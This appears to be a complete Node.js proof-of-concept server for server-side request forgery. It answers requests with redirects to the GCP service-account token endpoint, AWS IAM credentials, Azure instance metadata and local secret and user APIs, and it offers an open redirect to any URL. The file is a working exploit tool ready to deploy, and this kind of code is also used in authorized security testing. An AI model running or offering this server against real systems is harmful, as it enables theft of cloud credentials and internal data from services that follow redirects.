import http from 'node:http';

const PORT = process.env.PORT || 3000;

const server = http.createServer((req, res) => {
  const url = new URL(req.url, `http://${req.headers.host}`);

  if (url.pathname === '/gcp') {
    res.writeHead(302, {
      Location: 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token',
    });
    return res.end();
  }

  if (url.pathname === '/gcp-all') {
    res.writeHead(302, {
      Location: 'http://169.254.169.254/computeMetadata/v1/?recursive=true',
    });
    return res.end();
  }

  if (url.pathname === '/aws') {
    res.writeHead(302, {
      Location: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    });
    return res.end();
  }

  if (url.pathname === '/azure') {
    res.writeHead(302, {
      Location: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
    });
    return res.end();
  }

  if (url.pathname === '/local-secret') {
    res.writeHead(302, {
      Location: 'http://127.0.0.1:3000/api/secret',
    });
    return res.end();
  }

  if (url.pathname === '/local-users') {
    res.writeHead(302, {
      Location: 'http://127.0.0.1:3000/api/users',
    });
    return res.end();
  }

  if (url.pathname === '/redirect') {
    const target = url.searchParams.get('url');
    if (target) {
      res.writeHead(302, { Location: target });
      return res.end();
    }
    res.writeHead(400);
    return res.end('Missing ?url= parameter');
  }

  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end([
    'SSRF Redirect PoC Server',
    '',
    'Endpoints:',
    '  /gcp       - 302 -> GCP metadata token endpoint',
    '  /gcp-all   - 302 -> GCP metadata recursive',
    '  /aws       - 302 -> AWS IAM credentials',
    '  /azure     - 302 -> Azure instance metadata',
    '  /local-secret  - 302 -> http://127.0.0.1:3000/api/secret',
    '  /local-users   - 302 -> http://127.0.0.1:3000/api/users',
    '  /redirect?url=<target> - 302 -> arbitrary URL',
  ].join('\n'));
});

server.listen(PORT, () => {
  console.log(`SSRF redirect server running on port ${PORT}`);
});
